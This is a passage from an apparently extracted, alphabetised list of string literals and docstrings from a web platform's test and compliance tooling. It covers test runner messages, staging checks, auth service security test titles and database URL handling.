    "React\\.createContext\\(\\w*mock\\w*\\)",
    "Readiness endpoint returned status",
    "Readiness separation test failed:",
    "Readiness vs health separation working correctly",
    "Real LLM Coverage:",
    "Real Service Test Metrics Tracking\nULTRA DEEP THINK: Module-based architecture - Metrics tracking extracted for 450-line compliance",
    "Real Test Requirements Linter\n\nIntegrates into development workflow to enforce real test requirements.\nCan be used as pre-commit hook, CI check, or standalone validation.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction\n- Value Impact: Prevents test anti-patterns from entering codebase\n- Strategic Impact: Maintains test reliability and system integrity\n\nUsage:\n  python scripts/compliance/real_test_linter.py [--fix] [--strict] [file1 file2 ...]\n  \nOptions:\n  --fix     Attempt to automatically fix violations\n  --strict  Fail on any violations (for CI)\n  --files   Specific files to check (default: all project test files)",
    "Real Test Requirements Validator\n\nValidates test files against SPEC/testing.xml real test requirements:\n1. No mock component implementations inside test files\n2. Integration tests use real child components  \n3. Files must not exceed 300 lines\n4. Functions must not exceed 8 lines\n5. Minimal mocking (only external APIs)\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction\n- Value Impact: Prevents regression from invalid test patterns\n- Strategic Impact: Ensures test reliability and system integrity",
    "Realistic Test Data Models and Configuration\n\nThis module defines models, enums, and configuration data for realistic test data generation.",
    "Realistic Test Data Service\n\nBackward compatibility module that imports from the new modular structure.\nGenerates production-like test data for comprehensive testing.\nAddresses gaps identified in test_realism_analysis_20250811.md",
    "Realistic Test Data Service Module\n\nGenerates production-like test data for comprehensive testing.\nThis module addresses gaps identified in test realism analysis and provides\nrealistic patterns for LLM responses, logs, workloads, and performance scenarios.",
    "Realistic test data module - consolidates test data functionality.",
    "RealisticDataPatterns",
    "RealisticTestDataConfigManager",
    "RealisticTestDataService",
    "Reason:",
    "Received response:",
    "Recommendation: Manually refactor based on these suggestions.",
    "Recommendations:",
    "Recommended approach:",
    "Recommended splitting strategies:",
    "Redirect URI doesn't match staging",
    "Redirect to: [cyan]",
    "Redis URL should not use localhost in staging, got:",
    "Redis connection failed",
    "Redis container not available:",
    "Redis should be in degraded services",
    "Redis-dependent tests",
    "RedisTestMixin",
    "Reduce mocking by using real components and external API mocks only",
    "Reduce mocking in",
    "Refactor",
    "Referer",
    "Refresh token duration:",
    "Remaining L3 files:",
    "Remaining syntax errors:",
    "Remove duplicate test setup code from all test files.\n\nThis script finds and removes the duplicate sys.path manipulation code\nthat appears in hundreds of test files, ensuring only the centralized\nsetup_test_path() function is used.",
    "Remove expired sessions from database",
    "Remove or mark redundant tests",
    "Remove sessions inactive for specified days",
    "Removed original file",
    "Removing",
    "Renaming:",
    "Replace hardcoded sleeps in",
    "Replace mocks with real components or move to unit tests",
    "Replace with proper function signature and real implementation",
    "Replace with real data source or move to test fixtures",
    "Replace with real implementation or move to test directory",
    "Replaced UserFlowTestBase with unittest.TestCase",
    "Report format (default: text)",
    "Report saved to",
    "Report saved to:",
    "Report-only mode. Use --force-unsafe-fix and --confirm-unsafe for actual changes (NOT RECOMMENDED)",
    "Report:",
    "Reproduces: Error while closing socket [Errno 9] Bad file descriptor\n        Root Cause: Inadequate container lifecycle management",
    "Reproduces: Invalid token: Signature verification failed\n        Root Cause: Fragmented secret management",
    "Reproduces: JWT security validation error: Not enough segments\n        Root Cause: No validation of OAuth response completeness",
    "Reproduces: OAuth callback error: invalid_client (401)\n        Root Cause: Cross-environment credential misuse",
    "Reproduces: connect() got an unexpected keyword argument 'sslmode'\n        Root Cause: Missing SSL parameter compatibility handling",
    "Reproduces: password authentication failed for user 'postgres'\n        Root Cause: No pre-deployment validation framework",
    "Request payload too large. Maximum size:",
    "Request processed in 45ms",
    "Request processed successfully",
    "Request timeout",
    "Require Real LLM:",
    "Require Real Services:",
    "Reset all tables - use with caution",
    "Resilience and recovery validation tests",
    "Resource cleanup successful",
    "Resource cleanup test failed:",
    "Response:",
    "Result",
    "Result:",
    "Results saved to:",
    "Results will be saved to:",
    "Results:",
    "Resume execution from specific category",
    "Retry attempt 1 of 3",
    "Revenue-critical path tests (1-2min)",
    "Review recent deployments",
    "Review service dependencies",
    "Review shared fixtures and utilities",
    "Revoke all sessions for a user",
    "Root",
    "Root directory to scan",
    "Root endpoint returned status",
    "Root endpoint returned unexpected service:",
    "Run E2E tests with Cypress",
    "Run ESLint",
    "Run Jest in watch mode",
    "Run TypeScript type checking",
    "Run all WebSocket functionality tests.",
    "Run all coordination fix validation tests.",
    "Run all initialization tests.",
    "Run all integration tests",
    "Run all staging deployment tests",
    "Run all tests",
    "Run autonomous test review based on mode",
    "Run benchmark comparison with standard execution",
    "Run comprehensive staging tests",
    "Run integration tests separately with proper services running",
    "Run iterative test-fix loop",
    "Run multiple categories (e.g., '--categories unit integration api')",
    "Run previously failed tests first",
    "Run quick staging health checks only",
    "Run quick validation only",
    "Run specific category (e.g., 'unit', 'integration', 'api')",
    "Run tests against staging environment",
    "Run tests from a specific category",
    "Run tests in parallel",
    "Run tests matching pattern",
    "Run tests to validate they pass before suggesting fixes",
    "Run the complete E2E test suite.",
    "Run with --verbose to see details",
    "Running Backend Startup Tests",
    "Running Cypress E2E Tests",
    "Running ESLint...",
    "Running End-to-End Tests",
    "Running Frontend Startup Tests",
    "Running Jest Tests",
    "Running TypeScript type check...",
    "Running auth service startup integration tests...",
    "Running command:",
    "Running command:\n  pytest",
    "Running test:",
    "Running tests...",
    "Running verify_workflow_status.py validation tests...",
    "Running:",
    "SAFE MODE ENABLED: Only analysis and dry-run operations allowed",
    "SAFETY: Actual file splitting is disabled by default. Use force_unsafe=True if you really want to modify files (NOT RECOMMENDED). Consider manual refactoring instead.",
    "SAFETY: Automatic function refactoring is disabled. This operation is too dangerous for automatic execution. Please refactor manually.",
    "SAFETY: Cannot perform actual fixes in safe mode. Use dry_run=True for suggestions or explicitly set safe_mode=False and force_unsafe=True (NOT RECOMMENDED).",
    "SAFETY: Cannot perform actual fixes with safe mode enabled",
    "SAFETY: Unsafe operations require --confirm-unsafe flag. Please reconsider using manual refactoring instead.",
    "SCAN COMPLETE",
    "SECRET",
    "SECRET_MANAGER_PROJECT_ID",
    "SELECT",
    "SELECT 1 FROM pg_database WHERE datname = :db_name",
    "SELECT 1 as test_value",
    "SELECT current_database()",
    "SELECT name FROM sqlite_master WHERE type='table' AND name='auth_users'",
    "SELECT name FROM sqlite_master WHERE type='table';",
    "SELECT version()",
    "SERIALIZABLE",
    "SERVICE COORDINATION FIX VALIDATION SUMMARY",
    "SERVICE STARTUP ORCHESTRATION TEST",
    "SERVICE_ID",
    "SERVICE_SECRET",
    "SESSION_CREATED",
    "SESSION_EXPIRED",
    "SESSION_EXPIRE_HOURS",
    "SEVERITY BREAKDOWN:",
    "SIMULATING",
    "SLA compliance and incident prevention for",
    "SPEC",
    "SQL_ECHO",
    "SSL configuration issues:",
    "SSL parameter conversion issues:",
    "SSL parameter missing for regular connection",
    "SSL parameters present in Cloud SQL URL",
    "SSL parameters should be removed",
    "SSL parameters should be removed for Cloud SQL",
    "SSL parameters still present in Cloud SQL URL:",
    "STAGING",
    "STAGING DEPLOYMENT VALIDATION TEST SUITE",
    "STAGING ENVIRONMENT TEST RUNNER",
    "STAGING ENVIRONMENT TEST SUITE",
    "STAGING ERROR MONITOR LOGIC VALIDATION",
    "STAGING STARTUP SEQUENCE TESTS",
    "STAGING_API_URL",
    "STAGING_AUTH_URL",
    "STAGING_DATABASE_URL",
    "STAGING_FRONTEND_URL",
    "STAGING_REDIS_URL",
    "STAGING_URL",
    "STDERR:",
    "STDOUT:",
    "SUCCESS: No test stubs found in production code.",
    "SUCCESS: No tests found in excluded directories (site-packages, venv, etc.)",
    "SUCCESS: No violations found! All conftest.py files are at service-level.",
    "SUCCESS: Renamed to",
    "SUGGESTION: Function",
    "SUGGESTION: Refactor",
    "SUMMARY",
    "SUMMARY:",
    "Safe Name",
    "Safety check prevented file splitting:",
    "Save detailed JSON report to file",
    "Scale horizontally to reduce CPU load",
    "Scan Date:",
    "Scan all test directories in codebase",
    "Scan complete:",
    "Scan completed. Found",
    "Scan for test stubs",
    "Scan specific directory",
    "Scan specific file",
    "Scanned",
    "Scanning",
    "Scanning directory:",
    "Scanning file:",
    "Scanning for test failures...",
    "Scanning for test size violations...",
    "Scanning for test stubs...",
    "Scanning for test violations...",
    "Scanning test files in:",
    "Scanning tests...",
    "Schedule tech debt sprint to address",
    "Script to add pytest markers to test files based on their dependencies",
    "Script to fix common syntax errors in test files",
    "Script to standardize L3 test file naming convention\nRenames test_*_l3.py files to test_*.py and updates references",
    "Scripts",
    "Second allocation failed:",
    "Secret Access",
    "Secret Manager",
    "Secret access test failed:",
    "Secrets failed to load",
    "Security Tests for Auth Service - Critical Security Validation\nTests SQL injection, XSS, CSRF protection, and audit logging",
    "Security validation tests",
    "See",
    "Sending ping:",
    "Service '",
    "Service Coordination Fix Validation",
    "Service Initialization Order",
    "Service discovery failed with retry logic",
    "Service discovery timing fixes working correctly",
    "Service discovery timing test failed:",
    "Service should be ready after marking",
    "Service should not be ready initially",
    "Service should not be ready while initializing",
    "Service should not be ready while starting",
    "Service status is not healthy:",
    "Service temporarily unavailable",
    "Service token duration:",
    "Services are ready for testing!",
    "Services got same port - conflict not prevented",
    "Session",
    "Session Cleanup Job Tests\nTests automated session cleanup and maintenance operations\nFocuses on database cleanup and expired session management",
    "Session Management Tests for Auth Service\nTests complete session lifecycle with database operations\nCovers security, multi-device, and cleanup scenarios",
    "Session Test Data Factory\nCreates test sessions with proper expiration and metadata.\nSupports both active and expired sessions for comprehensive testing.",
    "Session expiration must be after creation time",
    "Session management imports failed:",
    "Session revoked",
    "Session.",
    "SessionFactory",
    "Setup async database engine for tests",
    "Setup database session for test",
    "Setup test database with proper configuration",
    "Severity:",
    "Should accept JSON output format",
    "Should accept table output format (default)",
    "Should be formatted for asyncpg",
    "Should contain Cloud SQL path",
    "Should detect staging environment for CORS config",
    "Should detect test environment during pytest run",
    "Should fail gracefully when missing required arguments",
    "Should fail gracefully with invalid run ID",
    "Should fail gracefully with invalid token",
    "Should fail gracefully with non-existent repository",
    "Should fail when --wait-for-completion used without --workflow-name",
    "Should fail when missing required arguments",
    "Should fail when no GitHub token provided",
    "Should fail when no token provided",
    "Should fail with invalid token",
    "Should fail with non-existent repository",
    "Should fail with non-existent workflow",
    "Should fail:",
    "Should handle Cloud Run environment",
    "Should have 1 pre-deployment error",
    "Should have 2 post-deployment errors",
    "Should have failed with authentication error",
    "Should have failed with invalid token",
    "Should have raised exception",
    "Should normalize URL for asyncpg",
    "Should not contain sslmode parameter, got:",
    "Should not show 'development mode' when ENVIRONMENT=staging",
    "Should not use dev instance ID in staging",
    "Should not validate",
    "Should not validate sync",
    "Should preserve Cloud SQL socket path, got:",
    "Should preserve host, port, and database name",
    "Should return False for invalid URL",
    "Should return False for production environment when pytest not detected",
    "Should return False for regular PostgreSQL URLs",
    "Should return None for None user",
    "Should return True for Cloud SQL URLs",
    "Should return True for valid PostgreSQL URL",
    "Should return True when ENVIRONMENT=test",
    "Should return True when TESTING=true",
    "Should return True when running under pytest",
    "Should return empty string when DATABASE_URL not set",
    "Should return string even for malformed URL:",
    "Should return user ID without separate database sync",
    "Should still contain Cloud SQL path",
    "Should use asyncpg driver, got:",
    "Should use raw DATABASE_URL from environment",
    "Should use staging defaults when DATABASE_URL not set, got:",
    "Show detailed output for each import",
    "Show detailed real e2e test information",
    "Show historical category statistics",
    "Show slowest tests",
    "Show warning messages",
    "Show what would be done without making changes",
    "Similar:",
    "Simple WebSocket Connectivity Test",
    "Simple WebSocket test client to verify basic connectivity.",
    "Simple frontend test runner",
    "Simple frontend test runner for Netra AI Platform\nMinimal dependencies for use by test_runner.py",
    "Simple functional test to verify WebSocket works in DEV MODE.\n\nThis script tests the actual WebSocket connection functionality by:\n1. Starting the development server\n2. Testing secure WebSocket connection\n3. Verifying bidirectional message flow\n4. Testing authentication and CORS\n5. Cleaning up resources",
    "Simple test fix loop - runs tests and fixes issues iteratively.",
    "Simple test script to verify service startup orchestration.\nTests the core startup sequence without complex integration.",
    "SimpleAgent",
    "Simulate OAuth authentication flow",
    "Simulate complete login flow and return tokens",
    "Simulate tests without real connections",
    "Simulate user authentication and return tokens",
    "Simulates asyncpg connection.",
    "Simulates pre-deployment validation.",
    "Size violations addressed:",
    "Skip environment setup (use existing environment variables)",
    "Skipped:",
    "Skipping",
    "Slow tests that may take longer to complete",
    "Some tests failed - see details above",
    "Some tests failed. Check the output above.",
    "Specific files to check (default: all test files)",
    "Specific module to test (e.g., netra_backend.app.services)",
    "Specific test files or directories",
    "Specific test files or directories to run",
    "Specific test files or patterns to run",
    "Split",
    "Split '",
    "Split from",
    "Split into",
    "Split into multiple focused test functions or extract helper methods",
    "Split large test files into smaller, focused test modules",
    "Split large test functions into smaller, focused tests",
    "Splitting",
    "Splitting suggestions for",
    "Splitting suggestions:",
    "StAgInG",
    "Staging",
    "Staging Configuration Test",
    "Staging Environment",
    "Staging Environment Test Script\nVerifies that the staging environment is properly configured and all components are communicating",
    "Staging environment health check failed",
    "Staging environment not available",
    "Staging environment not available for testing",
    "Staging environment not reachable",
    "Staging environment specific tests",
    "Staging should not allow dev login",
    "Staging should not allow mock auth",
    "Standalone Tests",
    "Standard pytest",
    "Standard rename failed:",
    "Start all services using dev launcher.",
    "Start test services for frontend real service testing",
    "Start test services for frontend real service testing.\n\nThis script manages Docker containers and local services needed for\nrunning frontend tests against real backend services.",
    "Start the development server.",
    "Starting",
    "Starting 100 test iterations...",
    "Starting Docker services...",
    "Starting E2E test import fixing...",
    "Starting WebSocket DEV MODE functional tests...",
    "Starting Workflow Status Verification Tests",
    "Starting automated test fix loop...",
    "Starting comprehensive fake test scan...",
    "Starting comprehensive test import fix...",
    "Starting database test...",
    "Starting development server...",
    "Starting local backend services...",
    "Starting optimized execution of",
    "Starting optimized test execution...",
    "Starting service coordination fix validation",
    "Starting services for E2E tests...",
    "Starting test import alignment...",
    "Starting test overlap analysis for",
    "Starting with 1 DB issues in",
    "Startup Test Executor\nHandles execution of backend, frontend, and E2E tests",
    "Startup Timing",
    "Startup took",
    "State collision detected:",
    "State parameter too short:",
    "State parameters must be cryptographically unique",
    "State should contain HMAC separator",
    "Static Assets",
    "Static assets are being served",
    "Static assets returned status",
    "Static assets test failed:",
    "Status",
    "Status:",
    "Stderr:",
    "Stdout:",
    "Step 1: Running smoke, unit, and critical tests...",
    "Step 2: Attempting to fix:",
    "Stop on first test failure",
    "Stopping development server...",
    "Stopping execution:",
    "Strategies:",
    "Stress tests with high load or concurrency",
    "Strict mode - fail on any violations",
    "Success Rate:",
    "Success Rate: N/A",
    "Success rate:",
    "Successful renames:",
    "Successful test runs:",
    "Successfully fixed:",
    "Suggested refactoring strategies:",
    "Suggested splitting strategies:",
    "Suggestion: Extract helper methods or split test logic",
    "Suggestion: Focus on core unit tests that test business logic",
    "Suite Breakdown:",
    "Summary:",
    "Supports",
    "Syntax error in",
    "Syntax error:",
    "Syntax errors fixed:",
    "Syntax fixes applied:",
    "SyntaxError",
    "System Startup Test Runner\nModular test runner for system startup and E2E tests\nLegacy entry point - redirects to new modular implementation",
    "System should be healthy despite degraded services",
    "TEST ALIGNMENT SUMMARY",
    "TEST CATEGORIES & COUNTS",
    "TEST COMPLIANCE REPORT",
    "TEST EXECUTION SUMMARY",
    "TEST FILE SIZE VIOLATIONS (",
    "TEST FUNCTION VIOLATIONS (",
    "TEST LIMITS VIOLATIONS REPORT",
    "TEST MAPPING TO ORIGINAL ISSUES:",
    "TEST OVERLAP ANALYSIS COMPLETE",
    "TEST PROCESS CLEANUP",
    "TEST RESULTS",
    "TEST RESULTS:",
    "TEST SIZE COMPLIANCE REPORT",
    "TEST SIZE FIXING SUMMARY",
    "TEST SIZE LIMITS ENFORCEMENT SYSTEM DEMONSTRATION",
    "TEST STUB DETECTION REPORT",
    "TEST SUMMARY",
    "TEST TYPE SUMMARY",
    "TESTING",
    "TESTING MODULE:",
    "TESTING | Service startup orchestration...",
    "TEST_DATABASE_URL",
    "TEST_DIRECTORIES = {\n    \"unit\": [\"netra_backend/tests/unit\"],\n    \"integration\": [\"netra_backend/tests/integration\"],\n    \"e2e\": [\"netra_backend/tests/e2e\"],\n    \"agents\": [\"netra_backend/tests/agents\"],\n    \"critical\": [\"netra_backend/tests/critical\"],\n    \"routes\": [\"netra_backend/tests/routes\"],\n    \"services\": [\"netra_backend/tests/services\"],\n    \"database\": [\"netra_backend/tests/database\"],\n    \"websocket\": [\"netra_backend/tests/websocket\"],\n    \"auth\": [\"netra_backend/tests/auth_integration\"],\n    \"performance\": [\"netra_backend/tests/performance\"],\n    \"security\": [\"netra_backend/tests/security\"],\n    \"mcp\": [\"netra_backend/tests/mcp\"],\n    \"utils\": [\"netra_backend/tests/utils\"],\n    \"validation\": [\"netra_backend/tests/validation\"],\n    \"config\": [\"netra_backend/tests/config\"],\n    \"startup\": [\"netra_backend/tests/startup\"],\n    \"llm\": [\"netra_backend/tests/llm\"],\n    \"core\": [\"netra_backend/tests/core\"],\n    \"unified_system\": [\"netra_backend/tests/unified_system\"],\n    \"test_framework\": [\"test_framework/tests\"]\n}",
    "TEST_DIRECTORIES\\s*=\\s*\\{[^}]+\\}",
    "TEST_ENV",
    "TEST_MODE",
    "TEST_ORGANIZATION_AUDIT.md",
    "TEST_UTILS IMPORT FIX RESULTS",
    "TIER COVERAGE:",
    "TIMEOUT",
    "TOKEN_CREATED",
    "TOKEN_REFRESHED",
    "TOKEN_REVOKED",
    "TOP OPTIMIZATION RECOMMENDATIONS",
    "TOP VALUE TESTS:",
    "TOTAL:",
    "Tables created in transaction",
    "Tables found after transaction:",
    "Tables found in transaction:",
    "Target:",
    "Test",
    "Test 10: Expired ID token",
    "Test 11: Missing email in OAuth provider response",
    "Test 12: Unverified email address from OAuth provider",
    "Test 13: Blocked email domain (spam/disposable)",
    "Test 14: Distributed tracing context propagation across services (L3)",
    "Test 15: Circuit breaker activation on repeated OAuth provider failures (L3)",
    "Test 16: Network connection failure to OAuth provider",
    "Test 17: Database connection failure during user creation",
    "Test 18: Redis session storage failure",
    "Test 19: Race condition in duplicate user creation",
    "Test 1: Basic successful OAuth login flow - THE DEFAULT CASE\n        This MUST work in production but is designed to initially fail.",
    "Test 20: JWT token validation and structure (L3)",
    "Test 21: WebSocket authentication token validation (L3)",
    "Test 22: CORS failure for cross-origin OAuth requests",
    "Test 23: Redirect URI mismatch attack prevention",
    "Test 24: Token injection attack prevention",
    "Test 25: Session fixation attack prevention",
    "Test 26: Extremely long email address handling",
    "Test 27: Unicode and special characters in user name",
    "Test 28: Null values in OAuth provider response",
    "Test 29: Concurrent login attempts from same user",
    "Test 2: PKCE code challenge verification failure (L3)",
    "Test 30: Token refresh while session is actively being used",
    "Test 3: OAuth nonce replay attack prevention (L3 with mock Redis)",
    "Test 4: OAuth code reuse attack prevention",
    "Test 5: CSRF token binding to session failure (L3)",
    "Test 6: HMAC signature verification failure on state parameter (L3)",
    "Test 7: Expired state parameter (>10 minutes)",
    "Test 8: Malformed ID token from OAuth provider",
    "Test 9: Invalid JWT signature in ID token",
    "Test Agent Initialization - Verify robust startup mechanisms\n\nSimple test to validate that the agent initialization improvements work correctly.\nTests fallback mechanisms, error handling, and graceful degradation.",
    "Test Auth Service Database Manager\nVerifies that the auth service database manager properly handles URL transformations\nand SSL parameter conversions according to the learnings.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Auth service reliability and stability\n- Value Impact: Prevents database connection failures in production\n- Strategic Impact: Ensures auth service can operate independently",
    "Test Auth Service Integration",
    "Test Auth Service Integration\nVerifies that the auth service is properly integrated with backend and frontend",
    "Test AuthDatabase proper initialization with validation.",
    "Test CORS configuration",
    "Test CORS validation.",
    "Test CSRF protection for state-changing operations",
    "Test Client for Auth Service\nHTTP test client with authentication helpers for testing auth endpoints.\nProvides convenient methods for auth operations and request handling.",
    "Test Cloud SQL URL handling in auth service\nEnsures proper handling of Cloud SQL Unix socket format",
    "Test Compliance Checker\nEnsures test files follow the same quality standards as production code:\n- Maximum 300 lines per file\n- Maximum 8 lines per function\n- No mock component implementations inside test files",
    "Test Configuration:",
    "Test Database Configuration\nHandles database setup, isolation, and cleanup for auth service tests.\nEach test gets isolated database state with proper cleanup.",
    "Test Environment Configuration\nManages environment variables and configuration for auth service tests.\nEnsures test isolation and proper cleanup of environment state.",
    "Test File Size Violations (>300 lines):",
    "Test Fixer Examples:",
    "Test Fixer for Real Test Requirements\n\nProvides automated and semi-automated fixes for test requirement violations.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity\n- Value Impact: Automates compliance with real test requirements\n- Strategic Impact: Reduces manual fix effort and prevents regressions",
    "Test Function Violations (>8 lines):",
    "Test Helper Functions\nUtility functions for auth service testing operations.\nProvides common functionality for test setup, data creation, and assertions.",
    "Test JSON output format",
    "Test JWT token format validation",
    "Test Limits Examples - See function docstrings for splitting strategies",
    "Test Limits Violation Examples and Fixes\nDemonstrates how to fix common test limit violations according to SPEC/testing.xml",
    "Test Mixins for Auth Service\nReusable test functionality as mixins for specific concerns.\nEach mixin provides focused functionality following single responsibility.",
    "Test OAuth authentication flow",
    "Test OAuth configuration endpoint",
    "Test OAuth flow locally with enhanced debugging",
    "Test OAuth login initiation",
    "Test OAuth provider failover in staging environment",
    "Test Overlap Analyzer\nAnalyzes test files for similarity and potential duplication using vector similarity techniques.",
    "Test PostgreSQL compliance for auth service\nVerifies all PostgreSQL learnings are properly implemented\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Auth service stability and reliability\n- Value Impact: Ensure robust database connections and configuration\n- Strategic Impact: Prevent database-related auth failures in production",
    "Test Process Cleanup Utility\nCleans up hanging Node.js and Python test processes on Windows",
    "Test Quality Report (Report Only)",
    "Test Redis session synchronization with database cleanup",
    "Test Report Analyzer - Analyzes test reports and identifies issues.",
    "Test Results:",
    "Test Runner for Example Message Flow System\n\nComprehensive test runner for the example message flow implementation\nwith detailed reporting and validation.\n\nBusiness Value: Ensures reliability of AI optimization demonstration system",
    "Test SQL injection attempts are logged",
    "Test SQL injection attempts in login endpoint",
    "Test SQL injection in service token endpoint",
    "Test SQL injection in token validation",
    "Test Settings Configuration\nCentralized test configuration and settings management.\nProvides type-safe configuration for different test scenarios.",
    "Test Size Violations Analysis and Reporting Script\n\n!!!! CRITICAL WARNING !!!!\nThis script is designed ONLY for analysis and reporting of test size violations.\nThe auto-fix capabilities are DISABLED by default and should ONLY be used:\n1. In dry-run mode for planning manual refactoring\n2. With explicit human review before any actual changes\n3. After backing up all affected files\n4. With immediate test validation after any changes\n\nNEVER use auto-fix in production code without thorough review!\n\nCapabilities:\n1. ANALYZE test files for size violations (SAFE)\n2. REPORT violations and suggest improvements (SAFE)\n3. DRY-RUN mode to preview potential changes (SAFE)\n4. ACTUAL fixes require explicit opt-in and multiple confirmations (DANGEROUS)\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Code Quality Analysis and Reporting\n- Value Impact: Identifies technical debt for manual remediation\n- Strategic/Revenue Impact: Provides metrics for prioritizing refactoring efforts",
    "Test Staging Startup Sequence\nTests the complete startup sequence for staging deployment.\nValidates service initialization order, dependencies, and configuration.",
    "Test Stub Detection and Removal Script\n\nThis script automatically detects test stubs, mock implementations, and placeholder\ncode in production files according to the SPEC/no_test_stubs.xml specification.\n\nUsage:\n    python scripts/remove_test_stubs.py --scan          # Scan for test stubs\n    python scripts/remove_test_stubs.py --fix           # Fix detected stubs\n    python scripts/remove_test_stubs.py --report        # Generate detailed report",
    "Test Stub Detection and Removal Tool",
    "Test Summary",
    "Test URL normalization handles all PostgreSQL URL formats.",
    "Test User",
    "Test Violations Reporter - Focus specifically on test file and function violations\nGenerates detailed reports with splitting suggestions for test limit violations.",
    "Test WebSocket configuration endpoint.",
    "Test WebSocket connection and functionality.",
    "Test WebSocket connection.",
    "Test WebSocket connectivity",
    "Test WebSocket health endpoint.",
    "Test XSS prevention in OAuth callback parameters",
    "Test XSS prevention in User-Agent header",
    "Test XSS prevention in login inputs",
    "Test a single endpoint",
    "Test agent",
    "Test alignment complete!",
    "Test all imports (comprehensive, slower)",
    "Test assertion failed",
    "Test async PostgreSQL connections for both backend and auth services\n\nThis script verifies that the new async-only PostgreSQL configuration\nworks correctly in local development environment.",
    "Test async auth operations work.",
    "Test auth service API endpoints",
    "Test auth service database connection",
    "Test auth service database connection during tests.\n\nThis test verifies that the auth service properly uses SQLite during pytest execution\nand doesn't incorrectly try to connect to PostgreSQL.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Test Infrastructure Reliability\n- Value Impact: Ensures auth tests run correctly in isolated environments\n- Strategic Impact: Enables reliable CI/CD and development workflows",
    "Test auth service health endpoint",
    "Test authentication flow.",
    "Test automatic session expiry via validate_session",
    "Test backend auth client integration",
    "Test backend service database connection",
    "Test basic WebSocket connection to the backend.",
    "Test basic service startup orchestration.",
    "Test category to run",
    "Test checking specific workflow run ID",
    "Test classes:",
    "Test cleanup job handles database errors gracefully",
    "Test cleanup job handles large number of sessions",
    "Test cleanup of expired sessions",
    "Test cleanup of inactive sessions",
    "Test cleanup preserves most recent sessions",
    "Test complete OAuth flow across all three services in staging",
    "Test complete connection lifecycle with events.",
    "Test complete end-to-end coordination workflow.",
    "Test complete token flow from creation to validation.",
    "Test completed successfully!",
    "Test comprehensive attack scenario",
    "Test comprehensive audit logging",
    "Test config file not found:",
    "Test configuration loading for staging environment.",
    "Test configuration loading with detailed logging for debugging staging issues.",
    "Test connection event handlers are properly configured.",
    "Test connection retry with exponential backoff.",
    "Test coverage calculation module.\n\nCalculates test coverage metrics and trends.\nFollows 450-line limit with 25-line function limit.",
    "Test coverage metrics calculator.\n\nCalculates test coverage and related metrics.\nFollows 450-line limit with 25-line function limit.",
    "Test database engine setup complete:",
    "Test database initialization and table creation",
    "Test discovery file not found:",
    "Test distribution by top-level directory:",
    "Test email format validation",
    "Test enforcement of maximum sessions per user",
    "Test execution error:",
    "Test execution failed:",
    "Test execution interrupted by user",
    "Test execution timed out",
    "Test failed",
    "Test failed login attempts are logged",
    "Test failed:",
    "Test file",
    "Test file and function limits compliance checker.\nEnforces SPEC/testing.xml rules: test files MUST follow same 450-line limit as production code,\ntest functions MUST follow same 25-line limit as production code.",
    "Test file exceeds",
    "Test file to analyze",
    "Test file to validate",
    "Test files:",
    "Test function '",
    "Test functions:",
    "Test graceful degradation with optional service failures.",
    "Test handling multiple sessions for same user",
    "Test health endpoints for all services",
    "Test if Cloud SQL connector can be imported",
    "Test interrupted by user",
    "Test level to run",
    "Test logout of all user sessions",
    "Test main API endpoints",
    "Test message for validation",
    "Test module split from original file",
    "Test passed",
    "Test password length validation",
    "Test pool monitoring and warning patterns.",
    "Test port allocation prevents conflicts.",
    "Test prevention of HTTP method override attacks",
    "Test prevention of token injection attacks",
    "Test processes running:",
    "Test proper resource cleanup.",
    "Test protection against large payload attacks",
    "Test rate limiting on login attempts",
    "Test rate limiting on token validation",
    "Test receiving model response via WebSocket.",
    "Test refactoring helper",
    "Test refactoring helper for splitting large test files.\n\nThis helper analyzes large test files and suggests intelligent splits based on:\n- Test categories (unit, integration, e2e)\n- Functionality being tested\n- Test classes and groupings\n- Dependencies between tests\n\nFeatures:\n- Analyzes large test files and suggests splits\n- Groups related tests for extraction\n- Maintains test dependencies when splitting\n- Generates new file names following conventions\n- Preserves imports and test utilities",
    "Test refresh attempt on expired session",
    "Test refreshing active session before expiry",
    "Test report saved to: workflow_verification_test_report.md",
    "Test run timed out",
    "Test runner to validate service coordination fixes.\n\nThis script runs the coordination system tests to ensure all issues\nidentified in test_critical_cold_start_initialization.py are resolved.",
    "Test script for staging error monitor logic validation.\n\nThis script tests the error threshold and decision logic without requiring GCP access.",
    "Test script for verify_workflow_status.py\n\nDemonstrates usage patterns and validates the script functionality.",
    "Test script to verify environment detection is working correctly.\nRun this to ensure all environment detection logic defaults to staging, not production.",
    "Test security headers are set properly",
    "Test sending a chat message.",
    "Test separation between readiness and health checks.",
    "Test service discovery handles timing issues.",
    "Test session created successfully!",
    "Test session data is isolated per session",
    "Test sessions are isolated between users",
    "Test size limits validator",
    "Test splitting strategy (default: hybrid)",
    "Test staging environment",
    "Test staging startup sequence",
    "Test suite for verify_workflow_status.py\n\nTests various scenarios and documents the verification results.",
    "Test table output format",
    "Test that Cloud SQL Unix socket URLs are handled correctly",
    "Test that Heroku-style postgres:// URLs are handled correctly",
    "Test that PostgreSQL URLs with sslmode are converted correctly",
    "Test that auth routes don't attempt to sync to a separate database",
    "Test that auth service can create tables in SQLite.",
    "Test that auth service initializes only one database connection",
    "Test that auth service uses DATABASE_URL from environment",
    "Test that auth service uses SQLite for database connections during tests.",
    "Test that connection.py calls the correct database URL method.",
    "Test that dependency resolution prevents early startup.",
    "Test that main_db_sync module does not exist (removed duplicate)",
    "Test that regular PostgreSQL URLs are handled correctly",
    "Test the AgentInitializationManager.",
    "Test the enhanced agent registry.",
    "Test the modular DataSubAgent.",
    "Test timed out",
    "Test to ensure auth service uses only ONE database connection\nPrevents regression of duplicate database connection issue",
    "Test token generation with mock user",
    "Test token validation",
    "Test token validation between services",
    "Test utilities and helper functions",
    "Test validation of expired session",
    "Test validation of valid session",
    "Test with no assertions",
    "TestClient/1.0",
    "TestPassword123!",
    "Testing AgentInitializationManager...",
    "Testing WebSocket connection...",
    "Testing against:",
    "Testing all modules in netra_backend.app...",
    "Testing complete coordination workflow",
    "Testing configuration loading...",
    "Testing critical error deployment scenario...",
